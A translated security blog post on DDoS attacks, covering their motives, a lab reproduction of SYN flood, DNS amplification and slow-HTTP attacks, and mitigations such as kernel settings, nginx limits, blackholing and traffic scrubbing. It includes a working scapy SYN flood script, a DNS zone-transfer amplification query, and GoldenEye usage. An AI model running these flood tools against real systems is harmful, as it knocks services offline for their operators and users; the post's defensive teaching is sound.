---
title: "A Brief Discussion of DDoS Attacks"
slug: vads9k
translationKey: vads9k
date: 2020-08-03T12:51:38+08:00
source: yuque/penetration
---

For this quarter's "dedicated learning session", I picked a well-worn topic: DDoS. I hope it brings you some inspiration.




For those readers who are prone to tl;dr, here are the conclusions up front:

1. Defending against DDoS attacks is a systems engineering effort — **no single method is absolutely effective**, hence `No silver bullet`. In short, effort must be invested across system architecture, infrastructure traffic, business logic, disaster recovery plans, and other areas to defend against DDoS. See the [What to Do When You Encounter DoS](#D3l2M) section of this post
2. Attack trends
    1. Common DDoS: large-packet SYN floods (core principle: `resource exhaustion`), TCP/UDP reflection (core principle: `source IP spoofing`)
    2. Gaming remains the industry most heavily targeted by DDoS attacks, accounting for `39%` of the overall distribution; in addition, live streaming, e-commerce, and other industries have become new targets of DDoS attacks
3. **For properly registered legitimate businesses, if the DDoS traffic exceeds 100G, you can file a police report.** See the [4 Counterattack and Tracing](#VsV7z) section of this post



---

# I. What Is DDoS
> <font style="color:#333333;">DDoS (Distributed Denial of Service), also known as a distributed denial-of-service attack. By controlling a botnet made up of numerous compromised machines ("chickens") or servers, hackers send a large number of seemingly legitimate requests at the target, thereby consuming massive network resources, paralyzing the network, and preventing users from accessing network resources normally.</font>
>

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1625105257635-7ed0d2f4-fc35-4d07-aab6-775dc6cc3fe9.png)

<font style="color:#333333;">The emergence of reflection-based DDoS attacks in particular provided the DDoS attack industry with a "nuclear weapon", amplifying attack traffic by nearly ten-thousand-fold, up to fifty-thousand-fold at most — a testament to its destructive power.</font>



![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623219400167-8f7f5748-58d4-439b-87b5-ad56756ce5ba.png)

Source: Verizon.

In the data collected by Verizon's "[2018 Data Breach Investigations Report](https://www.researchgate.net/publication/324455350_2018_Verizon_Data_Breach_Investigations_Report)", DDoS was the number one most common security incident vector.

## 0x01 Why DDoS Exists
> Ideological conflict
>
> Cyber warfare
>
> Extortion
>
> Business disputes
>

### (1) Competitors at Each Other's Throats


Quoting the analysis report from the analytics outfit [TOMsInsight](https://www.zhihu.com/column/tomsinsight) (click [here](https://zhuanlan.zhihu.com/p/28698605) to go directly)

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1596430707216-22a1e8a7-8748-477d-8432-f8e8ab6d885e.png)



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1596430338545-472e277d-d019-4791-b787-fd1c7b9a4858.png)

### (2) A Vicious Cycle
![](https://cdn.nlark.com/yuque/0/2020/png/166008/1596430859066-f5a2f1d6-3ed1-407b-b685-2f5be4806176.png)

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1596430309094-f1adf796-8b93-4897-be43-6806fb9a02b7.png)



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1596430790876-36a56990-a294-47b9-a102-1875c14729c0.png)



## 0x02 Types of DoS
### Protocol Attacks
SYN Flood

### Application-Layer Attacks
SMTP, HTTP, DNS, or HTTPS

### Volumetric Attacks
Internet Control Message Protocol (ICMP) and User Datagram Protocol (UDP)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1622445799251-07078130-72c3-46fb-85a2-8772848b2d6e.png)

Ordinary people have little to fear, but large companies are the primary targets. Downtime caused by DDoS attacks can cost them millions or billions of dollars. Small business owners can also suffer significant losses.



# II. DoS Attack Simulations
The following content is a reproduction of the article [DDoS Attack Simulation Reproduction - Xianzhi Community](https://xz.aliyun.com/t/70#toc-1).

## 0x01 SYN Flood
> The principle of a SYN flood attack is to block the third ACK packet of the TCP three-way handshake — that is, to not respond to the SYN+ACK packet sent by the server. Because the server never receives the acknowledgment from the client, it keeps the connection open until timeout. When a large number of such half-open connections are established, the result is a SYN flood attack.
>

### (1) Attack Testing
Below is a demo script for a multi-threaded SYN flood

```bash
# 01_sys_flood.py
# coding:utf-8

from scapy.all import *
from time import sleep
import _thread
import random

def syn_flood(ip, port):
	while True:
		rand = random.randint(0, 65535)
		send(IP(dst=ip)/TCP(dport=port, sport=rand), verbose=0)

def main():
	if len(sys.argv) != 4:
		print("参数错误, 用法如下")
		print("python syn_flood.py [IP] [Port] [Thread]")
		sys.exit()

ip     = sys.argv[1]
port   = int(sys.argv[2])
thread_count = int(sys.argv[3])

print("[!]SYN Flood start!")
for i in range(thread_count):
	_thread.start_new_thread(syn_flood, (ip, port))

while 1:
	sleep(1)
```

What Wireshark captured

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623312187588-b197b9fb-28c6-46c2-aac8-826113145744.png)

You can see the server has established a large number of half-open connections

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623312714139-73bd6356-a085-4bbb-b780-35934ffb2b52.png)

And the website becomes unreachable......

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623313467033-2465f407-3544-4cc5-aece-62384a7eccf0.png)

### (2) Settings to Mitigate SYN Flood Attacks
**tcp_syncookies**

> + When server resources are insufficient, try not to reject TCP SYN requests; instead, try to buffer the SYN requests and handle these TCP connection requests later when capacity allows.
> + If the concurrency is truly extremely high, enabling this is of little use.
>

In testing: after configuring `**tcp_syncookies=1**`, it could still hold up against 50 threads (meaning port 80 remained accessible); once I cranked it up to 1000 threads, it fell over just the same.

**tcp_synack_retries & tcp_syn_retries**

The default value of both is `5`. After lowering them to `3`, the machine actually withstood a 5-thread SYN flood!

```bash
net.ipv4.tcp_synack_retries = 3
net.ipv4.tcp_syn_retries = 3
```

### (3) Conclusion
All in all, under Ubuntu's default configuration, it cannot even withstand 5 threads.

But with the configuration below, it easily shrugs off 1000 threads.

```bash
# Increase the SYN queue length to 10240:
sysctl -w net.ipv4.tcp_max_syn_backlog=10240

# Enable SYN COOKIE:
sysctl -w net.ipv4.tcp_syncookies=1

# Reduce the number of retries:
sysctl -w net.ipv4.tcp_synack_retries=3 
sysctl -w net.ipv4.tcp_syn_retries=3
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623315220929-08254d04-e0a8-4869-8154-5a387535b307.png)

Admittedly, this measurement method is rather crude, but it is not hard to see the effectiveness of this mitigation approach.

References:

+ [https://huangwang.github.io/2019/10/30/Linux%E9%98%B2SYN-Flood%E6%94%BB%E5%87%BB%E7%9A%84%E6%96%B9%E6%B3%95/](https://huangwang.github.io/2019/10/30/Linux%E9%98%B2SYN-Flood%E6%94%BB%E5%87%BB%E7%9A%84%E6%96%B9%E6%B3%95/)



### (4) Other TCP Attacks
Malformed TCP packets are judged as malformed by exploiting the rules of TCP's own "flag bits" (FLAG), such as all six flag bits being 1 or all being 0.

## 0x02 DNS Amplification Attack
> The principle of a DNS amplification attack:
>
> Forge a DNS packet and send a domain-name query to a DNS server, and the response packet returned by the DNS server will be sent to the attacked host.
>
> The amplification comes from requesting a DNS response of type **ANY**: the packet the attacker sends to the server is 69 bytes long, while the ANY-type DNS packet the server returns to the attacked host is 535 bytes long — roughly a 7x amplification.————————————————
>

Normal DNS query: **source IP address** -----DNS query----> DNS server -----DNS reply packet----> **source IP address**

Attack DNS query: **spoofed IP address** -----DNS query----> DNS server -----DNS reply packet----> **spoofed IP address (attack target)**



First, let's capture the traffic of a normal DNS query

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623317882543-e36c881e-7d6f-4797-9b2a-d5e9a7c372ff.png)

Note: the request size is: 106,

and the response size is: 543;

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623317869893-9f586e3b-b3df-42f7-b041-1293027d7abe.png)

The ratio between the two is a full five-fold! So suppose I'm an attacker who wants to mount a DoS and my local bandwidth is only 10 Mbps — by spoofing the source IP and continuously querying the DNS server, I can amplify my "attack bandwidth" to 50 Mbps. Truly a case of "killing with a borrowed knife" and "using four ounces to move a thousand pounds".

### A Conjecture
If there were a zone transfer vulnerability, wouldn't more subdomains mean more returned data — thousands or tens of thousands of times the traffic for DoS. Wouldn't that be delightful.

So I dug through [rfc1035](https://datatracker.ietf.org/doc/html/rfc1035); simply specify `qtype=252`

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623320249083-2968facf-9e6e-4d56-9e82-a29e3e741106.png)

```bash
from  scapy.all import * 

i=IP(dst='[DNS_Server]')
u =UDP()
q =DNSQR(qname="[Vuln_Domain]", qtype=252)
d = DNS(rd=1, qdcount=1, qd=q)
r = (i/u/d)
sr1(r)
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1623320537920-ef68d60d-b172-4c98-be8d-61d635108b55.png)

## 0x03 HTTP Attacks


**Slow Headers**

+ Never send the `\r\n` that terminates the headers, keeping the server's connection open.



Slow HTTP

+ Specify a very large `Content-Length` and send the body very slowly.
+ For a concrete implementation, refer to chunked encoding

> [https://datatracker.ietf.org/doc/html/rfc2616.html#page-25](https://datatracker.ietf.org/doc/html/rfc2616.html#page-25)   
>
> [https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding)
>
> **Chunked encoding** is mainly used in scenarios where a large amount of data must be transmitted, but the length of the response cannot be known before the request has been fully processed. For example, when a large HTML table needs to be generated from data queried out of a database, or when a large number of images must be transferred.
>
> The data is sent as a series of chunks. The `Content-Length` header is not sent in this case. At the beginning of each chunk, the length of the current chunk must be added, expressed in hexadecimal, followed immediately by '\r\n', then the chunk itself, followed again by '\r\n'. The terminating chunk is a regular chunk whose distinguishing feature is that its length is 0. The terminating chunk is followed by a trailer, consisting of a (possibly empty) series of entity message headers.
>

A chunked response looks like this:

```plain
Transfer-Encoding: chunked
	




HTTP/1.1 200 OK
Content-Type: text/plain
Transfer-Encoding: chunked

7\r\n
Mozilla\r\n
9\r\n
Developer\r\n
7\r\n
Network\r\n
0\r\n
\r\n
```

## 0x04 Script-Kiddie Tool: GoldenEye
[https://github.com/jseidl/GoldenEye](https://github.com/jseidl/GoldenEye)

```plsql
 USAGE: ./goldeneye.py <url> [OPTIONS]

 OPTIONS:
    Flag           Description                     Default
    -u, --useragents   File with user-agents to use                     (default: randomly generated)
    -w, --workers      Number of concurrent workers                     (default: 50)
    -s, --sockets      Number of concurrent sockets                     (default: 30)
    -m, --method       HTTP Method to use 'get' or 'post'  or 'random'  (default: get)
    -d, --debug        Enable Debug Mode [more verbose output]          (default: False)
    -n, --nosslcheck   Do not verify SSL Certificate                    (default: True)
    -h, --help         Shows this help
```

Screenshot of it running

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1624437227769-3f43c7c8-fcc5-4693-9243-32d1396f6bb7.png)

The website on port 80 simply cannot be opened

>  In Wireshark, packets shown in black with red text are TCP error packets or packets with bad checksums.. 
>

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1624437155849-bf553bc8-0a42-4804-aae0-a3f0be5a3268.png)



---

# III. What to Do When You Encounter DoS
## (0) At Design Time
+ Introduce a port-knocking mechanism; see SPA in zero-trust SDP, port knocking, See: [https://zhuanlan.zhihu.com/p/163799770](https://zhuanlan.zhihu.com/p/163799770)
+ Consider procuring sufficient bandwidth, or at minimum identify fallback options
+ An emergency response plan for DoS, primarily the division of personnel and responsibilities
+ **Tiered strategy**
    1. For a platform, some services being hit by DDoS renders the entire site unavailable — e.g., if DNS goes down, it is equivalent to all services being down
    2. For applications with a strong account system such as e-commerce or gaming, if SSO login goes down, all services are down. An attacker only needs to take down these services to "catch the ringleader first". So from a security standpoint, you also need to consider applying different tiers of protection strategy to different assets. Per BCM (business continuity management) requirements, first classify and grade the assets, delineate different availability SLA requirements, and then implement different levels of protection according to the different SLAs. In terms of concrete protection strategy, services or functions that could cause a platform-level SPOF (single point of failure) should receive higher-cost defensive measures — "higher cost" means not only purchasing more ADS appliances, but potentially also building multiple disaster-recovery nodes, and they should also rank higher in monitoring and response priority.
    3. A matching set of DRP & BCP policies, along with real, periodic drills, so that you can respond calmly when facing extremely high-volume attacks.
    4. Business Continuity Planning (`BCP`); refer to [BSI Case Study: Lenovo Group, China (PDF)](https://www.bsigroup.com/LocalFiles/zh-cn/%e6%88%90%e5%8a%9f%e6%a1%88%e4%be%8b/BSI%e6%a1%88%e4%be%8b%e5%88%86%e6%9e%90%20%e8%81%94%e6%83%b3%e9%9b%86%e5%9b%a2%20%e4%b8%ad%e5%9b%bd.pdf)



## (1) Analyze Traffic Characteristics and Filter Selectively
> A DDoS attack is by nature an attack that can only be mitigated, never fully defended against. Unlike a vulnerability, where applying a patch settles the matter for good, with DDoS — even after purchasing and deploying the most competitive defense solutions currently on the market — there is absolutely no talk of a complete cure.
>

In [0x04 Script-Kiddie Tool: GoldenEye], we can analyze the characteristics of its traffic from the following angles:

+ Request headers
    - Referer
    - UA
+ Request body
    - Parameter character set
    - Parameter length

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1624437852227-09a4d5df-be22-490d-8bfe-9b2d329ddad4.png)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1624437825161-4a0c77a9-0ce9-4d16-89be-cff55fa45b75.png)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1624437778920-8be71988-5f21-4334-b834-f5c462fe1bf2.png)

So in 2014, after the tool's author discovered these patterns being used to fingerprint it, he adjusted the generation rules; see [https://wroot.org/posts/goldeneye-2-1-released-with-even-more-randomness/](https://wroot.org/posts/goldeneye-2-1-released-with-even-more-randomness/)



Below is the rule-editing interface of NSFOCUS's ADS appliance, where the payload is customizable

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1632753241135-b4e5e469-1b89-4af2-a808-f6251217f28b.png)

If a security team is reasonably capable, they can run a PoC exploit, capture packets to identify the characteristics of the attack payload, and write hexadecimal matching rules — a simple way to achieve manual customization.





## (2) BlackHole (Blackholing)
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1632752028796-3de1b1ac-f612-4090-b0f3-1d245c2ccdeb.png)

Many attacks last only a very short time, usually under 5 minutes, appearing as spike-shaped pulses on a traffic graph.

The reason this kind of attack is popular is that the "`attack-attack-pause-pause`" pattern works best: the moment the defense threshold is triggered and the defense mechanism starts to take effect, the attack stops — and the cycle repeats.

It's like a mosquito that doesn't bite you but buzzes around your ears: the moment you turn on the light to swat it, it vanishes; as soon as you turn the light off, it comes back — and you can't sleep.

Currently, China Telecom's Cloud Shield, dedicated to anti-DDoS, offers `[near-source scrubbing]` and `[traffic suppression]` services. For vendors that purchase its services, the IPs to be blackhole-routed can be customized and linked with Telecom's equipment. Blackhole routing is a crude, brute-force method: along with the attack traffic, access from some legitimate users also gets blackholed, which degrades the user experience. In essence it is a "sacrifice the pawn to save the king" approach to preserve link bandwidth for the remaining users. The reason this kind of paid service exists at all is that without it, the entire site would become completely inaccessible to all users.

For cloud-scrubbing vendors, they in fact also need to rely on blackhole routing in coordination with Telecom.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1632752538412-9bbd426a-4960-4551-89c7-491f39e68c9a.png)







## (3) Host Configuration
### Nginx Configuration
See: Rate Limiting with NGINX and NGINX Plus [https://www.nginx.com/blog/rate-limiting-nginx/](https://www.nginx.com/blog/rate-limiting-nginx/)

+ [https://www.nginx.com/blog/mitigating-ddos-attacks-with-nginx-and-nginx-plus/](https://www.nginx.com/blog/mitigating-ddos-attacks-with-nginx-and-nginx-plus/)

**Limiting the Number of Connections**

You can limit the number of connections a single client IP address can open to a value appropriate for real users. For example, you can allow each client IP address to open no more than 10 connections to the /store area of your site:

```powershell
limit_conn_zone $binary_remote_addr zone=addr:10m;

server {
    # ...
    location /store/ {
        limit_conn addr 10;
        # ...
    }
}
```

The `limit_conn_zone` directive configures a shared memory zone named addr to hold requests for a given key — in this case (as shown above) the client IP address `$binary_remote_addr`. The `limit_conn` directive in the `/store` location references the shared memory zone and sets a maximum of 10 connections per client IP address.

**Closing Slow Connections**

You can close connections that write data too infrequently, which may indicate an attempt to keep a connection open as long as possible (thereby reducing the server's ability to accept new connections). Slowloris is an example of this type of attack. The `client_body_timeout` directive controls how long NGINX waits between writes of the client body, and the `client_header_timeout` directive controls how long NGINX waits between writes of the client headers. The default for both directives is 60 seconds. This example configures NGINX to wait no more than 5 seconds between writes of the headers or body from the client:



```powershell
server {
    client_body_timeout 5s;
    client_header_timeout 5s;
    # ...
}
```

### iptables
Host firewall    Operating systems all ship with a software firewall; Linux servers generally use iptables. For example, to block requests from IP address 1.2.3.4, run the following command.

```powershell
$ iptables -A INPUT -s 1.2.3.4 -j DROP
```



---

# IV. Mainstream Industry Governance and Mitigation Approaches
## <font style="color:#333333;">1 Attack Governance</font>
<font style="color:#333333;">Most governance methods must be configured before a DDoS happens, and they require effective cooperation among network operators, network companies, and organizations worldwide in order to counter DDoS reasonably well.</font>

<font style="color:#333333;">Two metrics for evaluating DDoS defense:</font>

+ <font style="color:#333333;">False acceptance rate (missed alarms)</font>
+ <font style="color:#333333;">False rejection rate (false alarms)</font>

<font style="color:#333333;">The smaller these metrics, the better the DDoS defense.</font>

### <font style="color:#333333;">(1) Botnet Governance</font>
<font style="color:#333333;">Infection → sample → reverse analysis → bot removal tool / communication interception rules</font>



### <font style="color:#333333;">(2)</font> Governance of Address-Spoofing Attacks
Technical level: CERT, IETF

1. **CERT Advisory CA-1996-21**
+ Packets entering the internal network from an external interface whose source address belongs to the internal network (prevents attacks against the internal network)
+ Packets sent outward from the internal network whose source address does not belong to the internal network (prevents attacks against external networks)



2. **RFC 2827**
+ Ingress traffic filtering implemented on downstream routers, checking packet format



3. **Unicast Reverse Path Forwarding**
+ Unicast Reverse Path Forwarding (Unicast RPF)
+ The router checks whether the source address and source port of incoming packets are in the routing table; if not, the packet is dropped.
+ See IETF BCP 84

### <font style="color:#333333;">(3) Governance of Attack Reflection Points</font>
<font style="color:#333333;">Reflection point types: ACK, SNMP, NTP, CHARGEN, DNS (the most common)</font><font style="color:#333333;">Taking the most common type, the DNS reflection point, as an example, there are three classes of governance methods:</font>

1. **<font style="color:#333333;">Open Resolver Project verification</font>**

<font style="color:#333333;">DDoS risks:</font>

+ <font style="color:#333333;">The DNS server can be accessed from any address</font>
+ <font style="color:#333333;">No limit on the response rate to DNS query requests</font>
1. **<font style="color:#333333;">Install the Response Rate Limiting module</font>**

<font style="color:#333333;">An enhanced feature called Response Rate Limiting (RRL) has been added, aimed at mitigating DDoS amplification attacks.</font>

1. **<font style="color:#333333;">NIST SP 800-81</font>**

<font style="color:#333333;">Secure domain deployment guidelines, focused on ensuring data integrity and origin authentication. (No DDoS governance observed.)</font>

## <font style="color:#333333;">2 Attack Mitigation</font>
> _<font style="color:#555555;">Note: mitigation, not resolution.</font>_
>

1. <font style="color:#333333;">System optimization and adding bandwidth can indeed achieve some effect against small-scale DDoS. But first, the diminishing returns are obvious and it accomplishes little as DDoS bandwidth grows; second, it defies economic logic.</font>
2. <font style="color:#333333;">Firewalls, intrusion detection, and intrusion prevention systems have trouble detecting today's attack traffic that is "based on legitimate packets".</font>

### <font style="color:#333333;">(1) Traffic Dilution</font>
<font style="color:#333333;">Traffic scrubbing alone cannot handle large-scale network traffic, so traffic must first be diluted before scrubbing.</font>

<font style="color:#333333;">Traffic dilution approaches</font>

1. <font style="color:#333333;">CDN, to counter "DDoS launched against a domain name".</font>
2. <font style="color:#333333;">A more effective approach: Anycast.</font>
    1. <font style="color:#333333;">In anycast addressing, a network address and network nodes are one-to-many: each destination address maps to a group of receiving nodes, but a message is only sent to the node that is topologically closest.</font>
    2. <font style="color:#333333;">Anycast for stateless services is typically used to provide high-availability guarantees and load balancing.</font>
    3. <font style="color:#333333;">High availability. When one member of an Anycast group comes under attack, the router responsible for forwarding packets can decide how to forward them based on each member's response time; since the attacked member is unresponsive, packets are not forwarded to it, and the traffic gets "diluted" across the other members.</font>

### <font style="color:#333333;">(2) Traffic Scrubbing</font>
<font style="color:#333333;">Trade-offs: false positive rate, false negative rate.</font>

<font style="color:#333333;">Multiple scrubbing techniques applied simultaneously:</font>

+ <font style="color:#333333;">IP reputation checks</font>
    - <font style="color:#333333;">Drop packets from low-reputation IPs first</font>
    - <font style="color:#333333;">Extreme case => IP blacklist mechanism</font>
+ <font style="color:#333333;">Attack signature matching</font>
    - <font style="color:#333333;">Extract signatures of attack tools</font>
    - <font style="color:#333333;">Fingerprinting (static, dynamic)</font>
    - <font style="color:#333333;">Learn new signatures, retire old ones</font>
+ <font style="color:#333333;">Rate checks and limits</font>
    - <font style="color:#333333;">Frequency and rate of request packets show obvious anomalies</font>
    - <font style="color:#333333;">Limit the flow rate</font>
+ <font style="color:#333333;">TCP proxying and verification</font>
+ <font style="color:#333333;">Protocol integrity verification</font>
    - <font style="color:#333333;">DNS protocol: if the</font><font style="color:#7A7A7A;">Truncated</font><font style="color:#333333;"> bit (TC) in the Flags field of a name-resolution response is set, a normal client will resend the resolution request over TCP port 53. To improve efficiency, attack tools often do not process the server's response data.</font>
    - <font style="color:#333333;">The TC bit means "may be truncated": when a UDP response would exceed 512 B, only the first 512 B of content are returned, truncated. Clients will usually resend the original query over TCP.</font>
    - <font style="color:#333333;">HTTP protocol. Whether the client follows a 302 redirect can serve as a criterion.</font>
+ <font style="color:#333333;">Client authenticity verification</font>
    - <font style="color:#333333;">"Challenge-response" interactive verification</font>
    - <font style="color:#333333;">JavaScript requests in HTTP</font>
    - <font style="color:#333333;">CAPTCHAs</font>

<font style="color:#333333;"></font>

<font style="color:#333333;">In Huawei's Anti-DDoS solution, HTTP-type attacks can be verified via "source authentication".</font>

1. TCP/IP source authentication
    - TCP proxy
    - First-packet drop verification
2. **Application-layer source authentication**
    - 302 redirect (cannot defend against bot browsers)
    - Meta Refresh redirect
    - 307 redirect (POST)
3. User source authentication
    - CAPTCHA....

## <font style="color:#333333;">3 Related Work</font>
### <font style="color:#333333;">(1) Client Puzzle Schemes</font>
+ <font style="color:#333333;">Problems generated by the server should not be solvable via parallel computation. Note: hash-based problems do not satisfy this requirement</font>
+ <font style="color:#333333;">The discriminative power and difficulty of the problem</font>
+ <font style="color:#333333;">Mind the adaptability (user experience)</font>

### <font style="color:#333333;">(2) Computation-Intensive Client Puzzle Schemes</font>
+ <font style="color:#333333;">The client must consume considerable processor resources to solve the problem</font>
+ <font style="color:#333333;">The "improved time-lock puzzle" resists concurrency and comprehensively lowers cost</font>

### <font style="color:#333333;">(3) Memory-Intensive Schemes</font>
+ <font style="color:#333333;">Solving speed depends on the processing speed of the computer's hardware</font>

<font style="color:#333333;">Conclusion: the "improved time-lock" performs well overall => it can serve as a basis for further analysis.</font>

### <font style="color:#333333;">(4) Algorithm Implementation</font>
<font style="color:#333333;">MikroTik routers.</font>

<font style="color:#333333;">Birthday attack and the birthday paradox</font>

<font style="color:#333333;">Traffic model:</font>

+ <font style="color:#333333;">Computer communication is typically bursty.</font>

  

## 4 Counterattack && Tracing
Today, attacks with traffic over 100G can be filed as a criminal case, which is a big improvement over the past. In the old days, without connections to certain locally-flavored resources, you couldn't even get a case opened. But opening a case is only the first step of a long march: if you actually want to find the person, you must successfully complete the following steps:



1. <font style="color:#8C8C8C;">From the mass of attacks, find clues to work backwards from, such as the IP of a likely C&C server or related domain names</font>
2. <font style="color:#8C8C8C;">"Black" eats "black": take down the C&C server</font>
3. <font style="color:#8C8C8C;">Physically locate the attacker through login IPs or with the help of third-party APT big-data resources (if you can get access to them)</font>
4. <font style="color:#8C8C8C;">Accompany the police ("uncles") on the door-to-door arrest</font>
5. <font style="color:#8C8C8C;">Sue in court</font>



If the person has no special status, you may well get your wish; but if you run into certain special individuals, months of your work goes down the drain. As for the ability to fight "black" with "black", it depends on the security team itself having fairly strong penetration skills plus the leisure to do this kind of thing. For many companies the cost of this process is still a bit high: the barrier of merely having a capable security team is enough to eliminate the vast majority of companies. The author, in the past, merely happened by chance upon such a team.




---

# V. References
+ Analysis of the Internet's black market: The DDoS Apocalypse [https://zhuanlan.zhihu.com/p/28698605](https://zhuanlan.zhihu.com/p/28698605)
+ DDoS-Botnet Analysis Report for Hong Kong, China - Xianzhi Community [https://xz.aliyun.com/t/2515](https://xz.aliyun.com/t/2515)
+ [Recommended reading] A DDoS attack prevention tutorial [http://www.ruanyifeng.com/blog/2018/06/ddos.html](http://www.ruanyifeng.com/blog/2018/06/ddos.html)
+ Having Endured the "Baptism" of DDoS, Are You Still OK? [https://www.xuecaijie.com/it/183.html](https://www.xuecaijie.com/it/183.html)
+ How To Prevent DDoS Attacks? [https://hostnoc.com/how-to-prevent-ddos-attacks/](https://hostnoc.com/how-to-prevent-ddos-attacks/)
+ What is a DDoS Attack and How to Prevent One in 2021 [https://www.safetydetectives.com/blog/what-is-a-ddos-attack-and-how-to-prevent-one-in/](https://www.safetydetectives.com/blog/what-is-a-ddos-attack-and-how-to-prevent-one-in/)
+ DDoS Attacks Up 31% in Q1 2021: Report [https://beta.darkreading.com/attacks-breaches/ddos-attacks-up-31-in-q1-2021-report](https://beta.darkreading.com/attacks-breaches/ddos-attacks-up-31-in-q1-2021-report)
+ Rate Limiting with NGINX and NGINX Plus [https://www.nginx.com/blog/rate-limiting-nginx/](https://www.nginx.com/blog/rate-limiting-nginx/)
+ [A Brief Analysis of Large-Scale DDoS Defense Architecture - Handling T-scale Attack and Defense – ayazero | Vuln Life](https://www.vuln.cn/6950)
+ [Legal Weapons Against DDoS Attacks - FreeBuf](https://www.freebuf.com/geek/229421.html)
+ [How to Report to the Cyber Police After Suffering a DDoS Attack](https://tech.antfin.com/docs/2/58734?spm=a2c4g.11186623.2.8.uhGQXh)
+ [https://mp.weixin.qq.com/s/28jH5IPjCjRvj57MjEHqpg](https://mp.weixin.qq.com/s/28jH5IPjCjRvj57MjEHqpg)
+ [http://blog.nsfocus.net/2021-ddos/](http://blog.nsfocus.net/2021-ddos/)
